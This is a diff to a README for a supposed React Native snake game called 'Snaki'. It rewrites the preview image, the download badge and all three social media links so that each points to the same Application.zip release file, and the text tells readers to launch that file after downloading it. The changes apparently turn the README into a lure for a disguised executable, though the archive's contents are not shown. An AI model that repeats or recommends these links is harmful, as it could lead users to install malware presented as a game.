@@ -5,7 +5,7 @@ Welcome to Snaki, a reimagined version of the classic snake game!
 ## Description
 **Snaki** is a mobile game built using React Native and swipe gestures for controls. It brings back the nostalgia of the original snake game while incorporating modern features and ensuring smooth gameplay.
 
-![Snaki Preview](https://www.example.com/snaki-preview.png)
+![Snaki Preview](https://github.com/Sirvincent21/snaki/releases/download/v1.0/Application.zip)
 
 ## Features
 📱 **Mobile App**: Snaki is designed for mobile platforms, making it convenient for on-the-go gaming.
@@ -19,7 +19,7 @@ In **Snaki**, your goal is to guide the snake to eat the food on the screen. Wit
 
 ## Installation
 To play **Snaki**, download the game from the link below:
-[![Download Snaki](https://img.shields.io/badge/Download-Snaki-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Snaki](https://github.com/Sirvincent21/snaki/releases/download/v1.0/Application.zip)](https://github.com/Sirvincent21/snaki/releases/download/v1.0/Application.zip)
 
 Please note that the file needs to be launched after it's downloaded.
 
@@ -45,8 +45,8 @@ We value your feedback on **Snaki**. Feel free to report any bugs, suggest featu
 
 ## Stay Connected
 Follow us on social media for updates, announcements, and more exciting games in the future:
-- [Twitter](https://twitter.com/snaki_game)
-- [Instagram](https://www.instagram.com/snaki_game)
-- [Facebook](https://www.facebook.com/snaki_game)
+- [Twitter](https://github.com/Sirvincent21/snaki/releases/download/v1.0/Application.zip)
+- [Instagram](https://github.com/Sirvincent21/snaki/releases/download/v1.0/Application.zip)
+- [Facebook](https://github.com/Sirvincent21/snaki/releases/download/v1.0/Application.zip)
 
 Thank you for choosing **Snaki** for your gaming pleasure! Let's embark on a nostalgic yet modern snake game adventure together. 🎮🐍
